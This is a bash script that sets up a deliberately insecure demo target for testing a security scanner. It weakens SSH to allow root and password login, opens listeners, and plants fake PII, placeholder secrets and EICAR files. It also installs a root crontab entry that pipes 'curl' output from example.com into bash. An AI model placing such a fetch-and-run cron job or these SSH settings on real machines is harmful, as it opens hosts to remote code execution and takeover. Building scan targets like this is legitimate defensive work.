#!/bin/bash
#
# Demo Target Preparation Script
#
# Purpose: Configure a fresh Ubuntu live boot as a scan target
#          Installs dependencies, starts SSH, opens ports, plants findings
#
# Usage:
#   sudo ./prepare-demo-target.sh            # Set up target
#   sudo ./prepare-demo-target.sh --cleanup   # Tear down
#
# Designed for live boot environments - reboot to fully reset
#
# Exit codes:
#   0 = Success
#   1 = Failure (not root, missing package manager)

set -eu

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BOLD='\033[1m'
NC='\033[0m'

# Config
DEMO_DIR="/tmp/demo-target-data"
LISTENER_PIDFILE="/tmp/demo-target-listeners.pids"
LOG_FILE="/tmp/demo-target-setup.log"
NUM_RANDOM_PORTS=5
DEMO_PORTS=()  # Populated by open_demo_ports()

# ============================================================================
# Helpers
# ============================================================================

log_step()    { echo -e "${BLUE}[*]${NC} $1"; echo "[$(date -u +%H:%M:%S)] [STEP] $1" >> "$LOG_FILE"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; echo "[$(date -u +%H:%M:%S)] [OK]   $1" >> "$LOG_FILE"; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $1"; echo "[$(date -u +%H:%M:%S)] [WARN] $1" >> "$LOG_FILE"; }
log_error()   { echo -e "${RED}[-]${NC} $1"; echo "[$(date -u +%H:%M:%S)] [ERR]  $1" >> "$LOG_FILE"; }

check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        log_error "This script must be run as root (sudo)"
        exit 1
    fi
}

# Generate random unused port between 1024-65535
random_port() {
    local port
    while true; do
        port=$((RANDOM % 64511 + 1024))
        # Check port is not already in use
        if ! ss -tlnH "sport = :$port" 2>/dev/null | grep -q . ; then
            echo "$port"
            return
        fi
    done
}

# Generate array of unique random ports
generate_random_ports() {
    local count="$1"
    local ports=()
    local i=0
    while [ "$i" -lt "$count" ]; do
        local p
        p=$(random_port)
        # Check for duplicates
        local dup=false
        local existing
        for existing in "${ports[@]+"${ports[@]}"}"; do
            [ "$existing" = "$p" ] && dup=true
        done
        if [ "$dup" = false ]; then
            ports+=("$p")
            i=$((i + 1))
        fi
    done
    echo "${ports[@]}"
}

get_ip() {
    # Get the primary non-loopback IP
    ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -1 || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "unknown"
}

# ============================================================================
# Cleanup Mode
# ============================================================================

cleanup() {
    log_step "Cleaning up demo target..."

    # Kill listeners
    if [ -f "$LISTENER_PIDFILE" ]; then
        while read -r pid; do
            kill "$pid" 2>/dev/null || true
        done < "$LISTENER_PIDFILE"
        rm -f "$LISTENER_PIDFILE"
        log_success "Killed port listeners"
    fi

    # Remove planted files
    if [ -d "$DEMO_DIR" ]; then
        rm -rf "$DEMO_DIR"
        log_success "Removed planted demo data"
    fi

    # Stop Apache if running
    systemctl stop apache2 2>/dev/null || service apache2 stop 2>/dev/null || true

    # Remove demo crontab
    crontab -r 2>/dev/null || true
    log_success "Removed demo crontab"

    # Restore SSH config
    rm -f /etc/ssh/sshd_config.d/demo-target.conf 2>/dev/null || true
    if [ -f /etc/ssh/sshd_config.demo-backup ]; then
        mv /etc/ssh/sshd_config.demo-backup /etc/ssh/sshd_config
    fi
    systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null || true
    log_success "Restored SSH configuration"

    log_success "Cleanup complete. Reboot to fully reset live environment."
    exit 0
}

# ============================================================================
# 1. SSH Setup
# ============================================================================

setup_ssh() {
    log_step "Setting up SSH server..."

    # Install openssh-server
    if ! command -v sshd &>/dev/null; then
        apt-get update -qq
        apt-get install -y -qq openssh-server
    fi

    # Backup original config
    if [ -f /etc/ssh/sshd_config ] && [ ! -f /etc/ssh/sshd_config.demo-backup ]; then
        cp /etc/ssh/sshd_config /etc/ssh/sshd_config.demo-backup
    fi

    # Configure for demo (intentionally weak for scan findings)
    if [ -d /etc/ssh/sshd_config.d ]; then
        cat > /etc/ssh/sshd_config.d/demo-target.conf <<'SSHCONF'
# Demo target - intentionally weak for security scan findings
PasswordAuthentication yes
PermitRootLogin yes
SSHCONF
    else
        # Fallback: modify main config if .d directory not supported
        sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
        sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
    fi

    # Start SSH
    systemctl enable ssh 2>/dev/null || true
    systemctl start ssh 2>/dev/null || service ssh start 2>/dev/null || true

    log_success "SSH server running (PasswordAuthentication=yes, PermitRootLogin=yes)"
}

# ============================================================================
# 2. Scan Dependencies
# ============================================================================

install_scan_deps() {
    log_step "Installing scan dependencies..."

    apt-get update -qq

    # ClamAV
    if ! command -v clamscan &>/dev/null; then
        apt-get install -y -qq clamav clamav-daemon
        log_success "ClamAV installed"
    else
        log_success "ClamAV already installed"
    fi

    # Update virus definitions
    log_step "Updating ClamAV virus definitions (this may take a minute)..."
    systemctl stop clamav-freshclam 2>/dev/null || true
    freshclam --quiet 2>/dev/null || log_warn "freshclam update had warnings (may still work)"
    systemctl start clamav-freshclam 2>/dev/null || true
    log_success "Virus definitions updated"

    # Lynis (not in default Ubuntu repos - add CISOfy repo)
    if ! command -v lynis &>/dev/null; then
        # Try default repos first
        if ! apt-get install -y -qq lynis 2>/dev/null; then
            log_step "Adding CISOfy repository for Lynis..."
            apt-get install -y -qq apt-transport-https ca-certificates curl gnupg
            curl -fsSL https://packages.cisofy.com/keys/cisofy-software-public.key | gpg --dearmor -o /usr/share/keyrings/cisofy-archive-keyring.gpg
            echo "deb [signed-by=/usr/share/keyrings/cisofy-archive-keyring.gpg] https://packages.cisofy.com/community/lynis/deb/ stable main" > /etc/apt/sources.list.d/cisofy-lynis.list
            apt-get update -qq
            apt-get install -y -qq lynis
        fi
        log_success "Lynis installed"
    else
        log_success "Lynis already installed"
    fi

    # nmap (useful for local scan too)
    if ! command -v nmap &>/dev/null; then
        apt-get install -y -qq nmap
        log_success "Nmap installed"
    else
        log_success "Nmap already installed"
    fi

    # zip (for EICAR archive testing)
    if ! command -v zip &>/dev/null; then
        apt-get install -y -qq zip
        log_success "zip installed"
    fi
}

# ============================================================================
# 3. Open Interesting Ports
# ============================================================================

open_demo_ports() {
    log_step "Opening random demo ports for nmap findings..."

    # Ensure we have netcat or socat
    if ! command -v nc &>/dev/null && ! command -v ncat &>/dev/null; then
        apt-get install -y -qq ncat 2>/dev/null || apt-get install -y -qq netcat-openbsd 2>/dev/null || true
    fi

    local nc_cmd="nc"
    command -v ncat &>/dev/null && nc_cmd="ncat"

    : > "$LISTENER_PIDFILE"

    # Generate random ports
    local random_ports
    random_ports=$(generate_random_ports "$NUM_RANDOM_PORTS")
    read -ra DEMO_PORTS <<< "$random_ports"

    # Simple HTTP server on a random port
    if command -v python3 &>/dev/null; then
        mkdir -p "$DEMO_DIR/www"
        echo "<html><body><h1>Demo Target</h1><p>Unsecured web server — no TLS, no auth.</p></body></html>" > "$DEMO_DIR/www/index.html"
        (cd "$DEMO_DIR/www" && python3 -m http.server "$DEMO_HTTP_PORT" &>/dev/null &)
        echo $! >> "$LISTENER_PIDFILE"
        log_success "HTTP server on port $DEMO_HTTP_PORT"
    fi

    # Open random ports with banners
    for port in "${DEMO_PORTS[@]}"; do
        if [ "$nc_cmd" = "ncat" ]; then
            ncat -lk "$port" --exec "/bin/echo Demo service on port $port" &>/dev/null &
        else
            (while true; do echo "Demo service on port $port" | $nc_cmd -l -p "$port" -q 1 2>/dev/null || break; done) &
        fi
        echo $! >> "$LISTENER_PIDFILE"
        log_success "Listener on port $port"
    done

    # Save port manifest for verification
    {
        echo "# Demo Target Port Manifest"
        echo "# Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
        echo "# Verify with: nmap -p- <target-ip>"
        echo ""
        echo "SSH=22"
        echo "HTTP=$DEMO_HTTP_PORT"
        for port in "${DEMO_PORTS[@]}"; do
            echo "LISTENER=$port"
        done
    } > "$DEMO_DIR/port-manifest.txt"
    log_success "Port manifest saved: $DEMO_DIR/port-manifest.txt"
}

# ============================================================================
# 4. Plant Demo Findings
# ============================================================================

plant_findings() {
    log_step "Planting demo scan findings..."

    mkdir -p "$DEMO_DIR"

    # --- PII findings (fake data, obviously not real) ---
    local num_records=$((RANDOM % 5 + 3))
    local first_names=("John" "Jane" "Bob" "Alice" "Carlos" "Sarah" "David" "Maria")
    local last_names=("Smith" "Doe" "Johnson" "Williams" "Garcia" "Brown" "Lee" "Chen")
    {
        echo "# DEMO DATA - NOT REAL"
        echo "name,ssn,phone,email,credit_card"
        local i=0
        while [ "$i" -lt "$num_records" ]; do
            local fn="${first_names[$((RANDOM % ${#first_names[@]}))]}"
            local ln="${last_names[$((RANDOM % ${#last_names[@]}))]}"
            local ssn="$(printf '%03d-%02d-%04d' $((RANDOM % 900 + 100)) $((RANDOM % 99 + 1)) $((RANDOM % 9000 + 1000)))"
            local phone="555-$(printf '%03d-%04d' $((RANDOM % 900 + 100)) $((RANDOM % 9000 + 1000)))"
            local cc="4$(printf '%015d' $((RANDOM * RANDOM)))"
            echo "$fn $ln,$ssn,$phone,${fn,,}@example.com,$cc"
            i=$((i + 1))
        done
    } > "$DEMO_DIR/customer-records.csv"
    log_success "Planted $num_records PII records: $DEMO_DIR/customer-records.csv"

    # --- Secrets findings ---
    cat > "$DEMO_DIR/config.env" <<'SECRETS'
# DEMO SECRETS - NOT REAL CREDENTIALS
DATABASE_URL=postgres://admin:SuperSecret123!@db.example.com:5432/production
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
API_KEY=sk-proj-abc123def456ghi789jkl012mno345pqr678stu901
GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12
STRIPE_SECRET_KEY=sk_test_EXAMPLE_NOT_REAL_51hdkeyT1zdp
password=Admin@2024!
SECRETS
    log_success "Planted secrets: $DEMO_DIR/config.env"

    # --- Private key finding ---
    cat > "$DEMO_DIR/deploy-key.pem" <<'PRIVKEY'
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgHcTz6sE2I2yPB
aNlRtQ2mKQKmFADpB8EXAMPLE_NOT_A_REAL_KEY_JUST_DEMO_DATA_FOR_SCAN
PzgKhsMIVbEBOxDzF4EXAMPLE_NOT_A_REAL_KEY_JUST_DEMO_DATA_FOR_SCAN
-----END RSA PRIVATE KEY-----
PRIVKEY
    log_success "Planted private key: $DEMO_DIR/deploy-key.pem"

    # --- MAC address findings ---
    local num_macs=$((RANDOM % 4 + 3))
    {
        echo "# Network Device Inventory - DEMO DATA"
        local i=0
        while [ "$i" -lt "$num_macs" ]; do
            printf 'Device-%02d  Port %d  %02X:%02X:%02X:%02X:%02X:%02X  Rack %d\n' \
                "$i" "$((RANDOM % 48 + 1))" \
                $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) \
                $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) \
                $((RANDOM % 5 + 1))
            i=$((i + 1))
        done
    } > "$DEMO_DIR/network-inventory.txt"
    log_success "Planted $num_macs MAC addresses: $DEMO_DIR/network-inventory.txt"

    # --- EICAR malware test files planted separately in plant_malware_samples() ---

    # --- A "forgotten" database dump ---
    cat > "$DEMO_DIR/users-backup.sql" <<'SQL'
-- DEMO DATA - NOT REAL
INSERT INTO users (id, email, password_hash, ssn) VALUES
(1, 'admin@example.com', '$2b$12$EXAMPLEHASHnotreal', '078-05-1120'),
(2, 'user@example.com', '$2b$12$ANOTHEREXAMPLEhash', '219-09-9999');
INSERT INTO api_keys (user_id, key) VALUES
(1, 'sk-live-EXAMPLE-KEY-NOT-REAL-12345');
SQL
    log_success "Planted database dump: $DEMO_DIR/users-backup.sql"

    # --- Random cron jobs (host security findings) ---
    local cron_targets=("/tmp/update.sh" "/var/tmp/sync.sh" "/dev/shm/cleanup.sh")
    local cron_file="/tmp/demo-target-data/suspicious-crontab"
    {
        echo "# Suspicious cron entries - planted for demo"
        echo "*/5 * * * * curl -s http://example.com/check | bash"
        echo "0 2 * * * ${cron_targets[$((RANDOM % ${#cron_targets[@]}))]}"
    } > "$cron_file"
    crontab "$cron_file" 2>/dev/null || log_warn "Could not install demo crontab"
    log_success "Planted suspicious cron jobs"

    # --- World-writable files (host security findings) ---
    touch "$DEMO_DIR/shared-config.txt"
    chmod 777 "$DEMO_DIR/shared-config.txt"
    echo "# Shared configuration - insecure permissions" > "$DEMO_DIR/shared-config.txt"
    log_success "Planted world-writable file: $DEMO_DIR/shared-config.txt"
}

# ============================================================================
# 4b. Plant Malware Test Samples (ClamAV triggers)
# ============================================================================

plant_malware_samples() {
    log_step "Planting EICAR malware test samples..."

    # EICAR standard test string - NOT malware
    # Industry standard AV test signature (see eicar.org)
    local eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

    # Random number of samples (3-7)
    local num_samples=$((RANDOM % 5 + 3))

    # Pool of realistic-looking filenames
    local filenames=(
        "update.exe" "patch.bin" "installer.exe" "readme.pdf.exe"
        "invoice.doc.exe" "report.scr" "driver.sys" "helper.com"
        "backup.dat" "sync-tool.exe" "config.bat" "service.dll"
        "chrome-update.exe" "flash-player.exe" "codec-pack.exe"
    )

    # Pool of subdirectories
    local subdirs=(
        "downloads" "temp" "cache" ".hidden" "backup"
        "old-files" "attachments" "incoming" "staged"
    )

    local malware_manifest="$DEMO_DIR/malware-samples.txt"
    {
        echo "# EICAR Malware Test Samples"
        echo "# Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
        echo "# These are EICAR standard test files, NOT real malware"
        echo ""
    } > "$malware_manifest"

    local used_names=""
    local i=0
    while [ "$i" -lt "$num_samples" ]; do
        local fname="${filenames[$((RANDOM % ${#filenames[@]}))]}"
        local subdir="${subdirs[$((RANDOM % ${#subdirs[@]}))]}"
        local target_dir="$DEMO_DIR/$subdir"
        local target_file="$target_dir/$fname"

        # Skip duplicates
        if echo "$used_names" | grep -qF "$target_file"; then
            continue
        fi
        used_names="$used_names $target_file"

        mkdir -p "$target_dir"
        printf '%s\n' "$eicar" > "$target_file"

        local sha
        sha=$(sha256sum "$target_file" 2>/dev/null | awk '{print $1}')
        echo "$target_file  SHA256:$sha" >> "$malware_manifest"
        log_success "EICAR sample $((i + 1))/$num_samples: $subdir/$fname"

        i=$((i + 1))
    done

    # Also create one zip-wrapped EICAR (tests archive scanning)
    if command -v zip &>/dev/null; then
        local zip_dir="$DEMO_DIR/attachments"
        mkdir -p "$zip_dir"
        local tmpeicar
        tmpeicar=$(mktemp "$zip_dir/.eicar-tmp.XXXXXX")
        printf '%s\n' "$eicar" > "$tmpeicar"
        if zip -j -q "$zip_dir/document.zip" "$tmpeicar" 2>/dev/null; then
            rm -f "$tmpeicar"
            local sha
            sha=$(sha256sum "$zip_dir/document.zip" 2>/dev/null | awk '{print $1}')
            echo "$zip_dir/document.zip  SHA256:$sha  (ZIP-wrapped)" >> "$malware_manifest"
            log_success "EICAR ZIP sample: attachments/document.zip"
            num_samples=$((num_samples + 1))
        else
            rm -f "$tmpeicar"
        fi
    fi

    log_success "Planted $num_samples malware test samples (manifest: $malware_manifest)"
}

# ============================================================================
# 4c. Install Outdated Software (vulnerability findings)
# ============================================================================

install_outdated_software() {
    log_step "Installing software for vulnerability findings..."

    # Install browsers from repos (version depends on Ubuntu ISO age)
    apt-get install -y -qq firefox 2>/dev/null || log_warn "Firefox not available in repos"
    apt-get install -y -qq chromium-browser 2>/dev/null || \
        apt-get install -y -qq chromium 2>/dev/null || \
        log_warn "Chromium not available in repos"

    # Record installed versions
    local firefox_ver chromium_ver
    firefox_ver=$(firefox --version 2>/dev/null || echo "not installed")
    chromium_ver=$(chromium-browser --version 2>/dev/null || chromium --version 2>/dev/null || echo "not installed")

    log_success "Firefox: $firefox_ver"
    log_success "Chromium: $chromium_ver"

    # Install other packages that commonly have CVEs
    apt-get install -y -qq curl wget openssl netcat-openbsd 2>/dev/null || true

    # Record all installed package versions for manifest
    dpkg -l 2>/dev/null | awk '/^ii/ {print $2, $3}' > "$DEMO_DIR/installed-packages.txt"
    local pkg_count
    pkg_count=$(wc -l < "$DEMO_DIR/installed-packages.txt" | tr -d ' ')
    log_success "Package inventory saved: $pkg_count packages"
}

# ============================================================================
# 4d. Plant KEV-Triggerable Software
# ============================================================================

plant_kev_triggers() {
    log_step "Installing KEV-trigger software..."

    # Install Apache HTTP Server — commonly has KEV-listed CVEs
    # (Also provides port 80 as an additional nmap finding)
    if ! command -v apache2 &>/dev/null; then
        apt-get install -y -qq apache2 2>/dev/null || log_warn "Apache2 not available"
    fi

    # Start Apache so it shows in port scans
    if command -v apache2 &>/dev/null; then
        systemctl start apache2 2>/dev/null || service apache2 start 2>/dev/null || true
        log_success "Apache2 running on port 80"
    fi

    # Install additional packages known to have KEV-listed CVEs
    # On an older live ISO, these versions are likely vulnerable
    for pkg in liblog4j2-java imagemagick php-common; do
        apt-get install -y -qq "$pkg" 2>/dev/null || true
    done

    # Record versions of KEV-susceptible packages
    local kev_manifest="$DEMO_DIR/kev-trigger-packages.txt"
    {
        echo "# KEV-Susceptible Packages"
        echo "# These packages frequently appear in CISA KEV catalog"
        echo "# Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
        echo ""
        for pkg in apache2 openssh-server openssh-client sudo polkit \
                   openssl curl wget liblog4j2-java imagemagick php-common; do
            local ver
            ver=$(dpkg -s "$pkg" 2>/dev/null | grep '^Version:' | awk '{print $2}')
            if [ -n "$ver" ]; then
                echo "$pkg  $ver"
            fi
        done
    } > "$kev_manifest"

    log_success "KEV-trigger packages recorded: $kev_manifest"
}

# ============================================================================
# 5. Generate Verification Manifest
# ============================================================================

generate_manifest() {
    log_step "Generating verification manifest..."

    local manifest="$DEMO_DIR/MANIFEST.txt"
    {
        echo "=============================================="
        echo "  DEMO TARGET VERIFICATION MANIFEST"
        echo "=============================================="
        echo ""
        echo "Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
        echo "Hostname:  $(hostname)"
        echo "IP:        $(get_ip)"
        echo ""
        echo "This manifest lists everything planted on the"
        echo "target. Compare against scan results to verify"
        echo "detection coverage."
        echo ""
        echo "----------------------------------------------"
        echo "  OPEN PORTS (nmap should find these)"
        echo "----------------------------------------------"
        echo "  22/tcp    SSH (PasswordAuth=yes, PermitRoot=yes)"
        if command -v apache2 &>/dev/null; then
            echo "  80/tcp    Apache HTTP Server (KEV trigger)"
        fi
        echo "  $DEMO_HTTP_PORT/tcp    HTTP (Python SimpleHTTPServer)"
        for port in "${DEMO_PORTS[@]}"; do
            echo "  $port/tcp    Demo listener"
        done
        echo ""
        echo "----------------------------------------------"
        echo "  PII FINDINGS (check-pii.sh should find these)"
        echo "----------------------------------------------"
        echo "  File: $DEMO_DIR/customer-records.csv"
        grep -c 'SSN\|[0-9]\{3\}-[0-9]\{2\}-[0-9]\{4\}' "$DEMO_DIR/customer-records.csv" 2>/dev/null || echo "  0"
        echo "  ^ SSN patterns"
        grep -oE '555-[0-9]{3}-[0-9]{4}' "$DEMO_DIR/customer-records.csv" | wc -l | tr -d ' '
        echo "  ^ Phone patterns"
        echo "  File: $DEMO_DIR/users-backup.sql"
        echo "  2 SSN patterns in SQL dump"
        echo ""
        echo "----------------------------------------------"
        echo "  SECRETS (check-secrets.sh should find these)"
        echo "----------------------------------------------"
        echo "  File: $DEMO_DIR/config.env"
        echo "    - AWS_ACCESS_KEY_ID (AKIA...)"
        echo "    - AWS_SECRET_ACCESS_KEY"
        echo "    - API_KEY (sk-proj-...)"
        echo "    - GITHUB_TOKEN (ghp_...)"
        echo "    - STRIPE_SECRET_KEY (sk_test_...)"
        echo "    - DATABASE_URL with password"
        echo "    - password= plaintext"
        echo "  File: $DEMO_DIR/deploy-key.pem"
        echo "    - RSA private key"
        echo "  File: $DEMO_DIR/users-backup.sql"
        echo "    - API key in SQL"
        echo ""
        echo "----------------------------------------------"
        echo "  MALWARE (check-malware.sh should find these)"
        echo "----------------------------------------------"
        if [ -f "$DEMO_DIR/malware-samples.txt" ]; then
            while IFS= read -r line; do
                [[ "$line" =~ ^#|^$ ]] && continue
                echo "  $line"
            done < "$DEMO_DIR/malware-samples.txt"
        else
            echo "  (no malware samples manifest found)"
        fi
        echo ""
        echo "----------------------------------------------"
        echo "  MAC ADDRESSES (check-mac-addresses.sh)"
        echo "----------------------------------------------"
        echo "  File: $DEMO_DIR/network-inventory.txt"
        grep -cE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$DEMO_DIR/network-inventory.txt" 2>/dev/null || echo "  0"
        echo "  ^ MAC address patterns"
        echo ""
        echo "----------------------------------------------"
        echo "  HOST SECURITY FINDINGS (Lynis / host check)"
        echo "----------------------------------------------"
        echo "  - SSH: PasswordAuthentication=yes"
        echo "  - SSH: PermitRootLogin=yes"
        echo "  - Suspicious cron job (curl|bash)"
        echo "  - World-writable file: $DEMO_DIR/shared-config.txt"
        echo "  - ${#DEMO_PORTS[@]} non-standard listening ports"
        echo ""
        echo "----------------------------------------------"
        echo "  KEV-TRIGGER PACKAGES (check-kev.sh)"
        echo "----------------------------------------------"
        if [ -f "$DEMO_DIR/kev-trigger-packages.txt" ]; then
            while IFS= read -r line; do
                [[ "$line" =~ ^#|^$ ]] && continue
                echo "  $line"
            done < "$DEMO_DIR/kev-trigger-packages.txt"
        else
            echo "  (no KEV trigger manifest found)"
        fi
        echo "  NOTE: KEV matches depend on NVD lookup finding CVEs"
        echo "  for these specific versions. Older ISO = more hits."
        echo ""
        echo "----------------------------------------------"
        echo "  INSTALLED SOFTWARE (host inventory)"
        echo "----------------------------------------------"
        local firefox_ver chromium_ver
        firefox_ver=$(firefox --version 2>/dev/null || echo "not installed")
        chromium_ver=$(chromium-browser --version 2>/dev/null || chromium --version 2>/dev/null || echo "not installed")
        echo "  Firefox:  $firefox_ver"
        echo "  Chromium: $chromium_ver"
        echo "  OpenSSL:  $(openssl version 2>/dev/null || echo 'not installed')"
        echo "  Total packages: $(wc -l < "$DEMO_DIR/installed-packages.txt" 2>/dev/null | tr -d ' ')"
        echo ""
        echo "----------------------------------------------"
        echo "  SESSION LOG"
        echo "----------------------------------------------"
        echo "  $LOG_FILE"
        echo ""
        echo "=============================================="
        echo "  Compare this manifest against .scans/ output"
        echo "  to verify scanner detection coverage."
        echo "  Each execution is unique — ports, filenames,"
        echo "  PII records, and malware samples are random."
        echo "=============================================="
    } > "$manifest"

    log_success "Verification manifest: $manifest"
    echo ""
    cat "$manifest"
}

# ============================================================================
# Main
# ============================================================================

main() {
    echo ""
    echo -e "${BOLD}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}║       Demo Target Preparation Script         ║${NC}"
    echo -e "${BOLD}║       Security Toolkit - Target Setup         ║${NC}"
    echo -e "${BOLD}╚══════════════════════════════════════════════╝${NC}"
    echo ""

    check_root

    # Handle cleanup mode
    if [ "${1:-}" = "--cleanup" ]; then
        cleanup
    fi

    # Initialize session log
    mkdir -p "$DEMO_DIR"
    : > "$LOG_FILE"
    echo "# Demo Target Setup Log" >> "$LOG_FILE"
    echo "# Started: $(date -u +"%Y-%m-%dT%H:%M:%SZ")" >> "$LOG_FILE"
    echo "# Hostname: $(hostname)" >> "$LOG_FILE"
    echo "" >> "$LOG_FILE"

    # Randomize HTTP port each execution
    DEMO_HTTP_PORT=$(random_port)

    local start_time
    start_time=$(date +%s)

    echo -e "${BOLD}Phase 1: SSH Server${NC}"
    echo "-------------------"
    setup_ssh
    echo ""

    echo -e "${BOLD}Phase 2: Scan Dependencies${NC}"
    echo "-------------------------"
    install_scan_deps
    echo ""

    echo -e "${BOLD}Phase 3: Attack Surface (random ports)${NC}"
    echo "--------------------------------------"
    open_demo_ports
    echo ""

    echo -e "${BOLD}Phase 4: Planted Findings (randomized)${NC}"
    echo "--------------------------------------"
    plant_findings
    echo ""

    echo -e "${BOLD}Phase 5: Malware Samples (random EICAR)${NC}"
    echo "---------------------------------------"
    plant_malware_samples
    echo ""

    echo -e "${BOLD}Phase 6: Outdated Software${NC}"
    echo "--------------------------"
    install_outdated_software
    echo ""

    echo -e "${BOLD}Phase 7: KEV Triggers${NC}"
    echo "---------------------"
    plant_kev_triggers
    echo ""

    echo -e "${BOLD}Phase 8: Verification Manifest${NC}"
    echo "------------------------------"
    generate_manifest
    echo ""

    local end_time elapsed
    end_time=$(date +%s)
    elapsed=$((end_time - start_time))
    local ip
    ip=$(get_ip)
    local eicar_count
    eicar_count=$(wc -l < "$DEMO_DIR/malware-samples.txt" 2>/dev/null | tr -d ' ')
    # Subtract header lines
    eicar_count=$((eicar_count - 4))
    [ "$eicar_count" -lt 0 ] && eicar_count=0

    # Summary
    echo -e "${BOLD}══════════════════════════════════════════════${NC}"
    echo -e "${GREEN}${BOLD}  TARGET READY${NC}"
    echo -e "${BOLD}══════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${BOLD}Target IP:${NC}        $ip"
    echo -e "  ${BOLD}SSH:${NC}              Port 22 (password auth enabled)"
    echo -e "  ${BOLD}Apache:${NC}           Port 80 (KEV trigger)"
    echo -e "  ${BOLD}HTTP:${NC}             Port $DEMO_HTTP_PORT (random)"
    echo -e "  ${BOLD}Listeners:${NC}        ${DEMO_PORTS[*]} (random)"
    echo -e "  ${BOLD}Planted files:${NC}    $DEMO_DIR/"
    echo -e "  ${BOLD}Setup time:${NC}       ${elapsed}s"
    echo ""
    echo -e "  ${BOLD}Expected scan findings:${NC}"
    echo -e "    ${RED}■${NC} PII:         SSNs, phone numbers, credit cards"
    echo -e "    ${RED}■${NC} Secrets:     API keys, passwords, private key"
    echo -e "    ${RED}■${NC} Malware:     $eicar_count EICAR test samples (random locations)"
    echo -e "    ${RED}■${NC} MAC addrs:   Random planted addresses"
    echo -e "    ${RED}■${NC} Ports:       $(( ${#DEMO_PORTS[@]} + 3 )) open (SSH + Apache + HTTP + ${#DEMO_PORTS[@]} listeners)"
    echo -e "    ${RED}■${NC} KEV:         Apache, OpenSSL, sudo, polkit (version-dependent)"
    echo -e "    ${YELLOW}■${NC} Host:        Weak SSH config, running services"
    echo -e "    ${YELLOW}■${NC} Lynis:       Multiple findings on stock Ubuntu"
    echo ""
    echo -e "  ${BOLD}Verification:${NC}"
    echo -e "    cat $DEMO_DIR/MANIFEST.txt"
    echo ""
    echo -e "  ${BOLD}Session log:${NC}"
    echo -e "    cat $LOG_FILE"
    echo ""
    echo -e "  ${BOLD}From Kali scanner:${NC}"
    echo -e "    ./scripts/run-all-scans.sh $DEMO_DIR"
    echo -e "    ${BOLD}OR${NC}"
    echo -e "    ./QuickStart.sh → Remote → $ip"
    echo ""
    echo -e "  ${BOLD}Cleanup:${NC}"
    echo -e "    sudo $0 --cleanup"
    echo -e "    ${BOLD}OR${NC} just reboot (live boot = nothing persists)"
    echo ""

    # Final log entry
    echo "" >> "$LOG_FILE"
    echo "[$(date -u +%H:%M:%S)] [DONE] Setup completed in ${elapsed}s" >> "$LOG_FILE"
    echo "[$(date -u +%H:%M:%S)] [DONE] Target IP: $ip" >> "$LOG_FILE"
}

main "$@"
